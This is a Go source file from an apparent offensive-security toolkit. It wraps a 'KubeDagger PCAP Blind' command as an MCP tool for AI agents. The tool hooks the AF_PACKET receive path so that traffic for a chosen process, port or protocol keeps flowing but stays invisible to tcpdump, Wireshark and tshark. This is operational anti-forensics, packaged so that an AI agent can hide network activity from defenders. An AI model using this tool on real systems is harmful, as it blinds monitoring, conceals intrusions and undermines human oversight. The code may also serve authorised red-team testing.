package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type PcapBlindInput struct {
	Interface string `json:"interface,omitempty"`
	PID       int    `json:"pid,omitempty"`
	Port      int    `json:"port,omitempty"`
	Protocol  string `json:"protocol,omitempty"`
}

type PcapBlindTool struct {
	exec executor.Executor
}

func NewPcapBlind(exec executor.Executor) *PcapBlindTool {
	return &PcapBlindTool{exec: exec}
}

func (t *PcapBlindTool) Name() string { return "kubedagger_pcap_blind" }

func (t *PcapBlindTool) Description() string {
	return "Blind packet capture tools (tcpdump, Wireshark, tshark) by hooking the AF_PACKET socket receive path. Prevents specific traffic from being visible to network monitoring while allowing it to flow normally."
}

func (t *PcapBlindTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"interface": {
				"type": "string",
				"description": "Network interface to blind captures on"
			},
			"pid": {
				"type": "integer",
				"description": "Hide traffic from/to this process"
			},
			"port": {
				"type": "integer",
				"description": "Hide traffic on this port"
			},
			"protocol": {
				"type": "string",
				"enum": ["tcp", "udp", "icmp", "all"],
				"description": "Protocol to hide"
			}
		}
	}`)
}

func (t *PcapBlindTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input PcapBlindInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Interface, "interface"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"pcap-blind"}
	if input.Interface != "" {
		args = append(args, "--interface", input.Interface)
	}
	if input.PID > 0 {
		args = append(args, "--pid", fmt.Sprintf("%d", input.PID))
	}
	if input.Port > 0 {
		args = append(args, "--port", fmt.Sprintf("%d", input.Port))
	}
	if input.Protocol != "" {
		args = append(args, "--protocol", input.Protocol)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger pcap-blind failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger PCAP Blind\n\n")
	if output == "" {
		sb.WriteString("Capture blinding active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
